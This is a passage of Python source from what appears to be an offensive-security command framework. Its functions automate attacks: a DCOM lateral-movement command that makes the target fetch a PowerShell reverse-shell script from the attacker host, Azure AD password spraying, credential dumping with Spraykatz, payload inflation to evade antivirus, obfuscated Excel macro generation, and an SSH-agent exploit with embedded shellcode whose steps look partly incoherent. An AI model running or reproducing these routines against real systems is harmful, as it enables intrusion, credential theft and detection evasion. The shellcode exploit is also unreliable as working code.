        UTF-16 hexadecimal representation (e.g., `A` becomes `\u0041`). If no
        payload is provided as input, it prompts the user to input one, with a
        default value of `' or 1=1-- -`.

        Parameters:
            line (str): The input payload to encode. If empty, the user is prompted
            to provide one interactively.

        Returns:
            None: The encoded payload is printed to the console.
        """

        parser = cmd2.Cmd2ArgumentParser()
        parser.add_argument('payload', nargs='?', default="' or 1=1-- -", help="The payload to encode (default: ' or 1=1-- -), more help, use help utf")

        try:
            args = parser.parse_args(line.split())
            payload = args.payload

            if payload == "' or 1=1-- -":
                payload = input(f"    [!] Enter the payload to encode (default '{payload}'): ").strip() or payload

            utf = []
            for i in payload:
                utf.append("\\u00" + hex(ord(i)).split('x')[1])
                time.sleep(0.08)
                self.cmd("clear")
                print_msg(''.join([i for i in utf]))
            self.logcsv(f"utf {payload}")
        except SystemExit:
            print_error("Invalid arguments provided. Use '-h' for help. or help utf")
            return

    @cmd2.with_category(lateral_movement_category)
    def do_dcomexec(self, line):
        """
        Executes the Impacket dcomexec tool to run commands on a remote system using DCOM.

        This function performs the following actions:
        1. Validates the target host (rhost) and domain parameters.
        2. If the line argument is "pass", it searches for credential files with the pattern `credentials*.txt`,
        allows the user to select credentials, and constructs the dcomexec command using them.
        3. If the line argument is "hash", it searches for a hash file, prompts the user for a username, and
        constructs the dcomexec command using the hash.
        4. If line does not match "pass" or "hash", it displays an error message with usage instructions.

        Parameters:
        line (str): A command argument to determine the authentication mode.
                    If "pass", the function searches for credential files and authenticates using the selected file.
                    If "hash", it uses a hash file for authentication.
                    If neither, it prints an error message with usage instructions.

        Returns:
        None
        """

        rhost = self.params["rhost"]
        lhost = self.params["lhost"]
        domain = self.params["domain"]
        path = os.getcwd()
        if not is_binary_present("impacket-dcomexec"):
            print_warn("impacket-dcomexec is not installed. Installing.")
            self.cmd("sudo apt install impacket -y")
            return
        if not check_rhost(rhost):
            return
        self.onecmd('createrevshell')
        if line == "pass":
            credentials = get_credentials()
            if not credentials:
                return
            for user, passwd in credentials:
                command = (
                    f"impacket-dcomexec -object MMC20 -silentcommand -debug "
                    f"{domain}/{user}:{passwd}@{rhost} 'powershell.exe Invoke-WebRequest "
                    f"-Uri http://{lhost}/Invoke-PowerShellTcp.ps1 -OutFile C:\\Windows\\TEMP\\Invoke-PowerShellTcp.ps1'"
                )
                print_msg(command)
                self.cmd(command)
            return

        elif line == "hash":
            hash_value = get_hash()
            if not hash_value:
                return
            if ":" in hash_value:
                hashis = f"-hashes {hash_value}"
            else:
                hashis = f"-hashes :{hash_value}"
            user = input("    [!] Enter Username (default: Administrator): ") or 'Administrator'
            command = (
                f"impacket-dcomexec -object MMC20 -silentcommand -debug "
                f"{hashis} {domain}/{user}@{rhost} 'powershell.exe Invoke-WebRequest "
                f"-Uri http://{lhost}/Invoke-PowerShellTcp.ps1 -OutFile C:\\Windows\\TEMP\\Invoke-PowerShellTcp.ps1'"
            )
            print_msg(command)
            self.cmd(command)
            self.logcsv(f"dcomexec {command}")
            return

        else:
            print_error("Incorrect usage. Use 'pass' to authenticate with credentials or 'hash' to use a hash.")
            return
    @cmd2.with_category(post_exploitation_category)
    def do_pip_repo(self, line):
        """
        Sets up a local pip repository to serve Python packages for installation on a compromised machine without internet access.

        This function performs the following steps:
        1. Creates necessary directories for the pip repository.
        2. Checks for the presence of `pip-compile` and installs it if missing.
        3. Downloads a predefined list of Python packages to the local repository.
        4. Compiles the requirements for each package and downloads the compiled dependencies.
        5. Organizes the downloaded packages into a structured directory format.
        6. Generates an index for the pip repository.
        7. Serves the pip repository over HTTP, allowing the compromised machine to install packages from this local repository.

        Parameters:
        line (str): Command line input (not used in this function).

        Returns:
        None

        Example Usage:
        ```
        pip_repo
        ```
        """
        path = os.getcwd()
        sessions = f"{path}/sessions"
        repo = f"{sessions}/pip-repo"
        simple = f"{repo}/simple"
        lhost = self.params["lhost"]
        port = 8008
        os.makedirs(repo, exist_ok=True)
        if not is_binary_present("pip-compile"):
            print_warn("pip-compile not found in the system. Installing")
            self.cmd("pip3 install pip-tools")

        packages = [
            "requests", "python-libnmap", "pwncat-cs", "pwn", "groq", "PyPDF2", "docx", "python-docx", "olefile",
            "exifread", "pycryptodome", "impacket", "pandas", "colorama", "tabulate", "pyarrow", "keyboard",
            "flask-unsign", "name-that-hash", "certipy-ad", "ast", "pykeepass", "cmd2", "Pillow", "netaddr", "stix2"
        ]

        for package in packages:
            command = f"pip download {package} -d {repo}"
            print_msg(command)
            self.cmd(command)

        for package in packages:
            requirements = f"echo '{package}' > requirements.txt"
            print_msg(requirements)
            self.cmd(requirements)
            command = f"pip-compile --output-file={repo}/compiled_requirements.txt {repo}/requirements.txt"
            print_msg(command)
            self.cmd(command)
            command = f"pip download -r compiled_requirements.txt -d {repo}"
            print_msg(command)
            self.cmd(command)

        for filename in os.listdir(repo):
            if filename.endswith(('.whl', '.tar.gz')):
                package_name = filename.split('-')[0]
                package_dir = os.path.join(simple, package_name)
                os.makedirs(package_dir, exist_ok=True)
                shutil.move(os.path.join(repo, filename), os.path.join(package_dir, filename))

        generate_index(repo)

        os.chdir(repo)
        print_msg(f"Serving pip repository from {repo} at {port}")
        print_warn("At the target you can use this ~/.pip/pip.conf:")
        print_msg(f"""
        [global]
        index-url = http://{lhost}:{port}
        trusted-host = {lhost}
        """.replace("    ", ""))
        print_warn("Or you can use this one: ")
        print_msg(f"pip3 install <package_name> --index-url http://{lhost}:{port} --trusted-host {lhost}")
        server = f"cd {simple} && python3 -m http.server {port}"
        print_msg(server)
        self.cmd(server)
        self.logcsv(f"pip_repo {server}")
        print_warn(f"Shutdown the server at {port}")
        os.chdir(path)
        return

    @cmd2.with_category(post_exploitation_category)
    def do_apt_repo(self, line):
        """
        Creates a comprehensive local APT repository with enhanced dependency resolution.

        Improvements:
        1. More robust dependency and metadata handling
        2. Better error checking and logging
        3. Comprehensive package and dependency management

        Parameters:
        line (str): A space-separated list of package names to include in the repository.

        Returns:
        None
        """
        parser = cmd2.Cmd2ArgumentParser()
        parser.add_argument('packages', nargs='*', help="List of packages to include in the repository.")

        try:
            args = parser.parse_args(line.split())
            packages = args.packages

            if not packages:
                print_error("No packages specified. Please provide a list of packages to include in the repository.")
                return

            required_tools = ["apt-rdepends", "dpkg", "apt-get", "gzip", "gpg"]
            for tool in required_tools:
                if not shutil.which(tool):
                    print_warn(f"{tool} is not installed. Installing it now...")
                    subprocess.run(f"sudo apt-get install -y {tool}", shell=True, check=True)

            lhost = self.params["lhost"]
            rhost = self.params["rhost"]
            path = os.getcwd()
            sessions = f"{path}/sessions"
            credentials = f"{path}/sessions/credentials.txt"
            repo = f"{sessions}/apt-repo"
            os.makedirs(repo, exist_ok=True)

            arch = subprocess.check_output("dpkg --print-architecture", shell=True, text=True).strip()
            ubuntu_version = subprocess.check_output("lsb_release -cs", shell=True, text=True).strip()

            print_msg("Resolving and downloading packages with comprehensive dependency handling...")
            downloaded_packages = set()

            def resolve_and_download_dependencies(package_name):
                """
                Recursively resolve and download package dependencies with enhanced checks
                """
                if package_name in downloaded_packages:
                    return

                try:
                    deps_output = subprocess.check_output(
                        f"apt-cache depends --recurse --no-recommends --no-suggests {package_name}",
                        shell=True, text=True
                    )

                    dependencies = set(
                        line.split()[-1] for line in deps_output.splitlines()
                        if (line.strip().startswith('Depends:') or
                            line.strip().startswith('PreDepends:') or
                            line.strip().startswith('Recommends:'))
                    )

                    download_command = f"cd {repo} && apt-get download {package_name}:{arch}"
                    print_msg(f"Downloading: {package_name}")
                    subprocess.run(download_command, shell=True, check=True)
                    downloaded_packages.add(package_name)

                    for dep in dependencies:
                        if dep not in downloaded_packages:
                            try:
                                dep_download_cmd = f"cd {repo} && apt-get download {dep}:{arch}"
                                command = f"cd {repo} && apt-rdepends {package} | grep -v '^ ' | grep -v '^PreDepends' | grep -v '^Depends' | grep -v '^Recommends'"
                                subprocess.run(dep_download_cmd, shell=True, check=True)
                                subprocess.run(command, shell=True, check=True)
                                downloaded_packages.add(dep)
                            except subprocess.CalledProcessError:
                                print_warn(f"Could not download dependency: {dep}")

                except subprocess.CalledProcessError as e:
                    print_warn(f"Error processing package {package_name}: {e}")

            for package in packages:
                resolve_and_download_dependencies(package)

            print_msg("Generating comprehensive APT repository index...")
            command = f"dpkg-scanpackages -a {arch} {repo} /dev/null | gzip -9c > {repo}/Packages.gz"
            subprocess.run(command, shell=True, check=True)

            print_msg("Generating Release file...")
            current_time = datetime.utcnow()
            release_content = f"""Origin: Local Repository
            Label: Local Repository
            Suite: {ubuntu_version}
            Codename: {ubuntu_version}
            Version: 1.0
            Architectures: {arch}
            Components: main
            Description: Local APT repository with comprehensive dependency resolution
            Date: {current_time.strftime('%a, %d %b %Y %H:%M:%S UTC')}
            Valid-Until: {(current_time + timedelta(days=30)).strftime('%a, %d %b %Y %H:%M:%S UTC')}
            """.replace('            ','')

            with open(f"{repo}/Release", "w") as release_file:
                release_file.write(release_content)

            print_msg("Adding checksums to Release file...")
            os.chdir(repo)
            checksum_algos = ['md5sum', 'sha1sum', 'sha256sum']
            for algo in checksum_algos:
                try:
                    hash_output = subprocess.check_output(f"{algo} Packages.gz", shell=True, text=True)
                    algo_label = algo.upper()
                    release_content += f" {hash_output.split()[0]} {hash_output.split()[1]}\n"
                except subprocess.CalledProcessError:
                    print_warn(f"Could not generate {algo} checksum")

            with open(f"{repo}/Release", "w") as release_file:
                release_file.write(release_content)

            print_msg("Signing the repository...")
            try:
                subprocess.run("gpg --list-keys", shell=True, check=True)
            except subprocess.CalledProcessError:
                print_warn("No GPG key found. Generating a new key...")
                subprocess.run('''gpg --batch --generate-key << EOF
                %no-protection
                Key-Type: RSA
                Key-Length: 2048
                Name-Real: Local Repository
                Name-Email: repo@local
                Expire-Date: 0
                EOF'''.replace('                ',''), shell=True, check=True)

            subprocess.run(f"gpg --batch --yes --output {repo}/InRelease --clearsign {repo}/Release", shell=True, check=True)
            subprocess.run(f"gpg --batch --yes --output {repo}/Release.gpg --detach-sign -a {repo}/Release", shell=True, check=True)
            subprocess.run(f"gpg --clearsign --batch --yes --output {repo}/dists/kali-rolling/InRelease {repo}/dists/kali-rolling/Release ", shell=True, check=True)
            subprocess.run(f"gpg --detach-sign --armor --batch --yes --output {repo}/dists/kali-rolling/Release.gpg {repo}/dists/kali-rolling/Release", shell=True, check=True)
            subprocess.run(f"gpg --export --armor > {repo}/public.key", shell=True, check=True)
            subprocess.run(f"""mkdir -p {repo}/dists/kali-rolling/main/i18n
            touch {repo}/dists/kali-rolling/main/i18n/Translation-en_US.xz
            touch {repo}/dists/kali-rolling/main/i18n/Translation-en.xz
            """.replace('            ',''), shell=True, check=True)
            subprocess.run(f"""mkdir -p {repo}/dists/kali-rolling/main/cnf
            touch {repo}/dists/kali-rolling/main/cnf/Commands-amd64.xz
            """.replace('            ',''), shell=True, check=True)
            os.chdir(path)
            if not os.path.exists(credentials):
                if not username:
                    print_error("Username not defined.")
                    username = input("    [!] Enter the username: ")

                if not password:
                    print_error("Password not defined.")
                    password = input("    [!] Enter the password: ")
                subprocess.run(f"sshpass -p '{password}' scp {repo}/public.key {username}@{rhost}:/tmp/public.key", shell=True, check=True)
            else:
                credentials = get_credentials()
                if not credentials:
                    return
                for username, passwd in credentials:
                    subprocess.run(f"sshpass -p '{passwd}' scp {repo}/public.key {username}@{rhost}:/tmp/public.key", shell=True, check=True)
            generate_index(repo)
            print_msg("Starting web server to serve the APT repository...")
            command = f"""
            echo "deb [arch={arch} trusted=yes] http://{lhost}:8009 {ubuntu_version} main" | sudo tee /etc/apt/sources.list.d/localrepo.list
            sudo apt-key add /tmp/public.key
            sudo apt update
            """.replace('            ','')
            copy2clip(command)
            self.logcsv(f"apt_repo {command}")
            subprocess.run(f"python3 -m http.server 8009 --directory {repo}", shell=True, check=True)
            os.chdir(path)

        except subprocess.CalledProcessError as e:
            print_error(f"Command failed: {e.cmd}")
            print_error(f"Output: {e.output}")
            print_error(f"Return code: {e.returncode}")
        except SystemExit:
            print_error("Invalid arguments provided. Use '-h' for help or help apt_repo")
            return

    @cmd2.with_category(recon_category)
    def do_httprobe(self, line):
        """
        Executes the httprobe tool to probe domains for working HTTP and HTTPS servers.

        This function performs the following actions:
        1. Verifies if httprobe is installed; if not, it installs the tool automatically.
        2. Probes domains from the input file or standard input.
        3. Simplifies the user experience by minimizing required commands and leveraging self.params for defaults.

        Parameters:
        line (str): Optional command arguments specifying the domain or just httprobe.
                    Example usage:
                    just provide the domain: httprobe example.com

        Returns:
        None
        """

        httprobe_binary = "httprobe"
        domain = self.params["domain"]
        install_command = "go install github.com/tomnomnom/httprobe@latest"
        if not os.path.exists(os.path.expanduser("~/go/bin/httprobe")):
            self.cmd(install_command)

        input_file = get_users_dic('txt')
        http = input("    [!] Enter the http port default 80: ") or '80'
        https = input("    [!] Enter the https port default 443: ") or '443'
        concurrency = input("    [!] Enter the concurrency level default 50: ") or '50'
        timeout = input("    [!] Enter the Timeout in milisecs default 20000: ") or '20000'
        additional_params = f" -p http:{http} -p https:{https} -c {concurrency} -t {timeout}"
        if line:
            command = f"echo \"{line.strip()}\" | {httprobe_binary} {additional_params}"
        else:
            if input_file is not None:
                command = f"cat {input_file} | {httprobe_binary} {additional_params}"
            else:
                command = f"echo \"{domain}\" | {httprobe_binary} {additional_params}"
        print_msg(command)
        self.cmd(command)
        self.logcsv(f"httprobe {command}")
        return

    @cmd2.with_category(reporting_category)
    def do_eyewitness_py(self, line):
        """
        Automates EyeWitness installation and execution without requiring user input.

        This function installs EyeWitness if it is not already available, uses a default input file
        (`urls.txt`), and applies standard configurations to execute a web enumeration task
        automatically. No arguments or manual intervention are needed from the user.

        Behavior:
            - Installs EyeWitness if missing.
            - Uses `urls.txt` as the default input file.
            - Sets a default timeout of 60 seconds.
            - Automatically executes EyeWitness with predefined settings.

        Usage:
            witness
        """
        try:
            path = os.getcwd()
            eyewitness_repo = "https://github.com/FortyNorthSecurity/EyeWitness.git"
            eyewitness_path = os.path.join("external", ".exploit", "EyeWitness")
            eyewitness_path = path + "/" + eyewitness_path
            default_timeout = 60
            path = os.getcwd()
            domain = self.params["domain"]
            if not os.path.exists(eyewitness_path):
                print_warn("EyeWitness not found. Installing...")
                os.makedirs(eyewitness_path, exist_ok=True)
                self.cmd(f"git clone {eyewitness_repo} {eyewitness_path}")
                self.cmd(f"cd {eyewitness_path}/Python/setup && sudo ./setup.sh && pip3 install selenium && pip3 install pyvirtualdisplay")
                print_msg("EyeWitness installed successfully.")

            input_file = get_users_dic("txt")

            if input_file is None:
                input_file = f"{path}/sessions/domain_{domain}.txt"
                command = f"echo \"{domain}\" > {input_file}"
                print_msg("Crafting file domain: " + command)
                self.cmd(command)

            command = f"cd {eyewitness_path}/Python && python3 {eyewitness_path}/Python/EyeWitness.py -f {input_file} --web --timeout {default_timeout}"
            print_msg(f"Executing EyeWitness with command: {command}")
            self.cmd(command)
            self.logcsv(f"eyewitness_py {command}")
        except Exception as e:
            print_error(f"Error: {e}")

    @cmd2.with_category(reporting_category)
    def do_pup(self, line):
        """
        Processes HTML content from a specified URL using the pup utility and a default CSS selector.

        This function:
            - Retrieves HTML content from the URL stored in `self.params["url"]` using curl.
            - Filters the HTML content using the pup utility with a predefined CSS selector.
            - Displays the filtered result in the terminal.

        Behavior:
            - Requires `pup` to be installed.
            - Uses `self.params["url"]` as the source URL.
            - Applies the CSS selector 'table table tr:nth-last-of-type(n+2) td.title a' by default.

        Usage:
            pup
        """
        path = os.getcwd()
        pup_repo = "https://github.com/ericchiang/pup.git"
        pup_path = os.path.join("external", ".exploit", "pup")
        pup_path = path + "/" + pup_path
        try:
            if not is_binary_present("pup"):
                print_error("pup is not installed. Installing ''")
                print_msg(pup_repo)
                self.cmd(f"git clone {pup_repo} {pup_path}")
                command = f"cd {pup_path} && go get github.com/ericchiang/pup && go build && go install"
                print_msg(command)
                self.cmd(command)


            url = self.params.get("url")
            if not url:
                print_error("URL not defined in self.params['url']. use assing url http://url.com")
                url = input("    [!] Enter the url to pup: ")

            default_selector = "table table tr:nth-last-of-type(n+2) td.title a"
            default_selector = input(f"    [!] Enter the default selector {default_selector}: ") or default_selector
            command = f"curl -s {url} | pup '{default_selector}'"
            print_msg(f"Executing: {command}")
            self.cmd(command)
            self.logcsv(f"pup {command}")
        except Exception as e:
            print_error(f"Error: {e}")
        return

    @cmd2.with_category(recon_category)
    def do_recon(self, line):
        """
        Performs reconnaissance on a specified domain using crt.sh (the target must be visible on internet), pup, httprobe, and EyeWitness.

        This function automates the process of gathering subdomains for a given domain, verifying
        their reachability, and generating a report using the EyeWitness tool.

        Workflow:
            1. Determines the target domain from the `line` argument or defaults to `self.params["domain"]`.
            2. Queries the crt.sh certificate transparency logs for subdomains using `curl`.
            3. Filters and extracts domain-related text data using `pup`.
            4. Sorts and removes duplicate entries, then validates subdomains with `httprobe`.
            5. Saves the results to a temporary file.
            6. Executes EyeWitness to generate a web-based reconnaissance report for the subdomains.

        Requirements:
            - `pup`: A command-line HTML parser.
            - `httprobe`: A tool to check live HTTP/HTTPS endpoints.
            - EyeWitness: A tool for generating web reconnaissance reports.

        Parameters:
            line (str): The domain to target for reconnaissance. If omitted, the domain defaults to `self.params["domain"]`.

        Examples:
            1. Specify a domain directly:
                >>> recon domain.com

            2. Use the default domain from self.params:
                >>> recon
        Raises:
            None. Errors in execution will be logged or printed as part of the command output.

        """
        path = os.getcwd()
        sessions = f"{path}/sessions"
        eyewitness_path = os.path.join("external", ".exploit", "EyeWitness")
        eyewitness_path = path + "/" + eyewitness_path

        if line:
            domain = line.strip()
        else:
            domain = self.params["domain"]

        command_eye = f"/usr/share/eyewitness/EyeWitness.py "
        command = "domain={dom};curl -fsSL \"https://crt.sh/?q=${domain}\" | pup 'td text{}' | grep \"${domain}\" | sort -n | uniq | httprobe > {sessions}/enum_tmp_{dom}.txt;  {command_eye} -f {sessions}/enum_tmp_{dom}.txt --web".replace("{dom}", domain).replace("{command_eye}",command_eye).replace("{sessions}",sessions)

        print_msg(command)
        time.sleep(1)
        self.cmd(command)
        print_msg(command)
        self.logcsv(f"recon {command}")
        return

    @cmd2.with_category(exploitation_category)
    def do_digdug(self, line):
        """
        Executes Dig Dug to inflate the size of an executable file, leveraging pre-configured settings
        and interactive input for minimal user effort.

        This function integrates with the Dig Dug tool to increase an executable's size by appending
        dictionary words. It automates repository setup, selects the input file from user prompts or defaults,
        and uses sensible configurations to execute the inflation process. Dig Dug is particularly useful
        for evading AV/EDR detections by exceeding size thresholds for analysis.

        Behavior:
            - Automatically clones the Dig Dug repository if not already present in `external/.exploit/DigDug`.
            - Calls the `venom` command to prepare the necessary payloads for execution.
            - Prompts the user to select an input executable and specify the desired size increase.
            - Uses a default dictionary (`google-10000-english-usa-gt5.txt`) for padding.

        Requirements:
            - A Python environment with required dependencies.
            - Executable files available in the working directory or `sessions`.

        Usage:
            Invoke this function to inflate the size of a generated payload or user-specified executable.
            Interactive prompts will guide the input selection and size configuration.

        Examples:
            1. Increase the size of a selected payload by 100 MB:
                >>> digdug

            2. Use the default configurations to inflate an executable:
                No additional parameters are required. The user is prompted for size and file selection.
        """
        try:
            digdug_repo = "https://github.com/RedSiege/DigDug.git"
            digdug_path = os.path.join("external", ".exploit", "DigDug")
            current_path = os.getcwd()
            sessions = f"{current_path}/sessions"
            digdug_full_path = f"{current_path}/{digdug_path}"

            if not os.path.exists(digdug_path):
                print_warn("Dig Dug not found. Installing...")
                os.makedirs(digdug_path, exist_ok=True)
                self.cmd(f"git clone {digdug_repo} {digdug_path}")
                print_msg("Dig Dug installed successfully.")

            self.onecmd('venom')

            input_file = get_users_dic("exe")
            size = input("    [!] Specify the desired size in megabytes to increase by default 100: ") or 100
            dictionary = f"{digdug_full_path}/dictionaries/google-10000-english-usa-gt5.txt"
            command = f"cd {sessions} && python3 {digdug_full_path}/digdug.py -i {input_file} -m {size}"
            command += f" -d {dictionary}"
            print_msg(f"Executing Dig Dug with command: {command}")
            self.cmd(command)
            self.logcsv(f"digdug {command}")
        except Exception as e:
            print_error(f"Error: {e}")

    @cmd2.with_category(credential_access_category)
    def do_adsso_spray(self, line):
        """
        Performs a password spray attack on Azure Active Directory Seamless Single Sign-On (SSO) using a specified list of users.

        This function automates the process of spraying a given password across multiple user accounts in a target domain. It utilizes
        a user list in the form of a text file, targeting Azure AD Seamless SSO endpoints. The results are processed and saved to
        a specified output file, providing insights into which accounts were successful or failed during the attack.

        Requirements:
            - A valid domain and URL for the target Azure AD instance. (assing url https://url.com)
            - A user dictionary file containing usernames (without the domain) to be sprayed.

        Parameters:
            line (str): Command-line input passed to the function (not currently used in the function).

        Behavior:
            - Loads the domain and URL from the configuration stored in `self.params`.
            - Reads the user list from a file specified in `get_users_dic`.
            - Sprays the specified password to all users and processes the results.
            - Saves the successful and failed attempts to the output file.

        Example:
            - Perform a password spray attack with the password "admin" and save the results:
                >>> adsso_spray
            - Customize the password or user list by modifying `self.params` before invoking the function.

        """
        domain = self.params["domain"]
        url = self.params["url"]
        users_dic = get_users_dic("txt")
        path = os.getcwd()
        sessions = f"{path}/sessions"
        output_file = f"{sessions}/adsso_stpray_{domain}.txt"
        password = input("    [!] Password to spray. Defaults to admin: ") or 'admin'
        wait = input("    [!] Number of seconds to sleep between individual user attempts default 0: ") or '0'
        users = []

        for line in users_dic:
            users.append(line.split('@')[0].strip())


        results = Spray(domain, users, password, url, wait, True, False)
        ProcessResults(results, output_file)
        return

    @cmd2.with_category(credential_access_category)
    def do_creds_py(self, line):
        """
        Searches for default credentials associated with a specific product or vendor, using the Default Credentials Cheat Sheet.

        This function automates the process of querying the Default Credentials Cheat Sheet for default credentials of various products.
        It searches for the specified product or vendor, providing relevant default credentials for pentesters during engagements.

        Behavior:
            - Automatically clones the Default Credentials Cheat Sheet repository if not already present in `external/.exploit/DefaultCreds`.
            - Executes a search command with the product/vendor specified by the user.
            - Returns the default credentials for the requested product or vendor.

        Requirements:
            - Python environment with necessary dependencies.
            - Access to the Default Credentials Cheat Sheet repository.

        Usage:
            Run this function to search for default credentials related to a product or vendor.
            The user is prompted to enter the product/vendor for which they need credentials.

        Examples:
            1. Search for default credentials of 'tomcat':
                >>> creds search tomcat
        """
        try:
            creds_repo = "https://github.com/incredibleindishell/DefaultCreds-cheat-sheet.git"
            path = os.getcwd()
            creds_path = os.path.join("external", ".exploit", "DefaultCreds")
            creds_path = f"{path}/{creds_path}"
            if not os.path.exists(creds_path):
                print_warn("Default Credentials Cheat Sheet not found. Installing...")
                os.makedirs(creds_path, exist_ok=True)
                self.cmd(f"git clone {creds_repo} {creds_path}")
                self.cmd("pip3 install tinydb")
                self.cmd("pip3 install prettytable")
                self.cmd("pip3 install fire")
                print_msg("Default Credentials Cheat Sheet installed successfully.")

            product = line.strip()
            if not product:
                product = input("    [!] Please specify a product/vendor: ") or 'tomcat'


            command = f"python3 {creds_path}/creds search {product}"
            print_msg(f"Executing command: {command}")
            self.cmd(command)
            self.logcsv(f"creds_py {command}")
        except Exception as e:
            print_error(f"Error: {e}")

    @cmd2.with_category(exploitation_category)
    def do_sshexploit(self, line):
        """
        Exploits OpenSSH vulnerability CVE-2023-38408 via the PKCS#11 feature of the ssh-agent.

        Steps:
        1. Attacker connects via SSH to a target server.
        2. Identify and export the SSH_AUTH_SOCK environment variable.
        3. Send crafted shellcode to exploit the PKCS#11 vulnerability.
        4. Load malicious libraries via ssh-add and trigger SIGSEGV for code execution.

        Usage:
            do_sshexploit

        Example:
            do_sshexploit

        Note:
            This function is for educational purposes only. Unauthorized exploitation is illegal.
        """
        try:

            target_ip = self.params["rhost"]
            lport = self.params["lport"]

            print_msg("Step 1: Connecting to the target server...")
            self.cmd(f"ssh {target_ip}")

            print_msg("Step 2: Identifying and exporting SSH_AUTH_SOCK...")
            ssh_sock = subprocess.getoutput("echo /tmp/ssh-*/agent.*")
            if not ssh_sock:
                print_error("Unable to identify SSH_AUTH_SOCK. Ensure ssh-agent is running.")
                return
            os.environ["SSH_AUTH_SOCK"] = ssh_sock
            print_msg(f"SSH_AUTH_SOCK set to {ssh_sock}")

            print_msg("Step 3: Adding malicious PKCS#11 stub...")
            self.cmd("ssh-add -s /usr/lib/systemd/boot/efi/linuxx64.elf.stub")

            print_msg("Step 4: Sending crafted shellcode...")
            buf =  b""
            buf += b"\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48\x8d"
            buf += b"\x05\xef\xff\xff\xff\x48\xbb\xa8\xf2\x2d\xd8\x8c"
            buf += b"\x5c\x6a\xde\x48\x31\x58\x27\x48\x2d\xf8\xff\xff"
            buf += b"\xff\xe2\xf4\xc2\xdb\x75\x41\xe6\x5e\x35\xb4\xa9"
            buf += b"\xac\x22\xdd\xc4\xcb\x22\x67\xaa\xf2\x38\x6b\x86"
            buf += b"\x56\x64\xd4\xf9\xba\xa4\x3e\xe6\x4c\x30\xb4\x82"
            buf += b"\xaa\x22\xdd\xe6\x5f\x34\x96\x57\x3c\x47\xf9\xd4"
            buf += b"\x53\x6f\xab\x5e\x98\x16\x80\x15\x14\xd1\xf1\xca"
            buf += b"\x9b\x43\xf7\xff\x34\x6a\x8d\xe0\x7b\xca\x8a\xdb"
            buf += b"\x14\xe3\x38\xa7\xf7\x2d\xd8\x8c\x5c\x6a\xde"
            cmd = f'(perl -e \'print "\\0\\0\\x27\\xbf\\x14\\0\\0\\0\\x10/usr/lib/modules\\0\\0\\x27\\xa6" . "\\x90" x 10000\'; echo -n "{buf}") | nc -U "$SSH_AUTH_SOCK"'
            self.cmd(cmd)
            self.logcsv(f"sshexploit {cmd}")
            print_msg("Step 5: Uploading malicious libraries via ssh-add...")
            libraries = [
                "/usr/lib/titan/libttcn3-rt2-dynamic.so",
                "/usr/lib/x86_64-linux-gnu/libKF5SonnetUi.so.5.92.0",
                "/usr/lib/x86_64-linux-gnu/libns3.35-wave.so.0.0.0",
            ]
            for lib in libraries:
                self.cmd(f"ssh-add -s {lib}")

            print_msg("Step 6: Triggering SIGSEGV...")
            self.cmd(f"nc localhost {lport}")

            print_msg("Exploit completed. You now have access to the target user.")
        except Exception as e:
            print_error(f"An error occurred: {e}")

    @cmd2.with_category(miscellaneous_category)
    def do_tab(self, line):
        """
        Executes the `lazypyautogui.py` script with optional arguments.
        This open new terminal tab and then run and instance of LazyOwn strokes the keyboard with pyautogui

        If a `line` argument is provided, it appends the argument to the command.
        Otherwise, it runs the script without additional parameters. The constructed
        command is displayed and executed in the system shell.

        Parameters:
            line (str): Optional argument to pass as input to the `lazypyautogui.py` script.

        Returns:
            None
        """
        if line:
            command = f"python3 modules/lazypyautogui.py {line}"
        else:
            command = f"python3 modules/lazypyautogui.py"
        print_msg(command)
        self.cmd(command)
        return

    @cmd2.with_category(exploitation_category)
    def do_excelntdonut(self, line):
        """
        Generates an Excel 4.0 (XLM) macro from a provided C# source file using EXCELntDonut.

        This function:
            - Installs EXCELntDonut dependencies if not already installed.
            - Clones the EXCELntDonut repository if not present.
            - Compiles the provided C# source file into shellcode.
            - Generates the XLM macro and saves it to a specified output file.

        Behavior:
            - Requires `mono-complete` and `pip3` with required Python packages installed.
            - Accepts parameters for input file, references, sandbox checks, obfuscation, and output file.
            - Outputs the generated macro in a `.txt` or `.csv` format.

        Usage:
            excelntdonut -f <source_file.cs> -r <references> [--sandbox] [--obfuscate] [-o <output_file>]

        Example:
            excelntdonut -f payload.cs -r System.Windows.Forms.dll --sandbox --obfuscate -o macro.txt
        """
        path = os.getcwd()
        repo_url = "https://github.com/RedSiege/EXCELntDonut.git"
        repo_path = os.path.join(path, "external", ".exploit", "EXCELntDonut")
        install_script = os.path.join(repo_path, "install.sh")
        domain = self.params["domain"]
        try:
            if not os.path.exists(repo_path):
                self.cmd(f"git clone {repo_url} {repo_path}")
                self.cmd(f"chmod +x {install_script} && {install_script} && chmod +x {repo_path}/EXCELntDonut")

            args = line.split()
            input_file = get_users_dic("cs")
            output_file = f"{path}/sessions/output_{domain}.txt"
            references = input("    [!] Enter the References default (System.Management) : ") or 'System.Management'
            sandbox = "--sandbox"
            obfuscate = "--obfuscate"

            if not input_file or not references:
                raise ValueError("Input file (-f) and references (-r) are required.")

            command = f"cd {repo_path}/EXCELntDonut && python3 -W ignore {repo_path}/EXCELntDonut/drive.py -f {input_file} -r '{references}'"
            if sandbox:
                command += " --sandbox"
            if obfuscate:
                command += " --obfuscate"
            if output_file:
                command += f" -o {output_file}"
            print_msg(command)
            self.cmd(command)
            self.logcsv(f"excelntdonut {command}")
        except Exception as e:
            print_error(f"Error: {e}")
        return

    @cmd2.with_category(credential_access_category)
    def do_spraykatz(self, line):
        """
        Executes the Spraykatz tool to retrieve credentials on Windows machines and large Active Directory environments.

        This function:
            - Installs Spraykatz if not already installed.
            - Executes the Spraykatz command with the provided parameters.
            - Displays the result in the terminal.

        Behavior:
            - Requires `python3`, `python3-pip`, `git`, and `nmap` to be installed.
            - Uses parameters from `self.params` for username, password, and target.

        Usage:
            spraykatz
        """
        path = os.getcwd()
        credentials = f"{path}/sessions/credentials.txt"
        spraykatz_repo = "https://github.com/aas-n/spraykatz.git"
        spraykatz_path = os.path.join(path,"external" ,".exploit" ,"spraykatz")

        try:
            target = self.params.get("rhost")
            if not os.path.exists(spraykatz_path):
                print_msg("Spraykatz is not installed. Installing...")
                self.cmd(f"git clone --recurse-submodules {spraykatz_repo} {spraykatz_path}")
                self.cmd(f"cd {spraykatz_path} && pip3 install -r requirements.txt")

            if not os.path.exists(credentials):
                if not username:
                    print_error("Username not defined.")
                    username = input("    [!] Enter the username: ")

                if not password:
                    print_error("Password not defined.")
                    password = input("    [!] Enter the password: ")
                command =  f"cd {spraykatz_path} && ./spraykatz.py -u {username} -p {password} -t {target}"
            else:
                credentials = get_credentials()
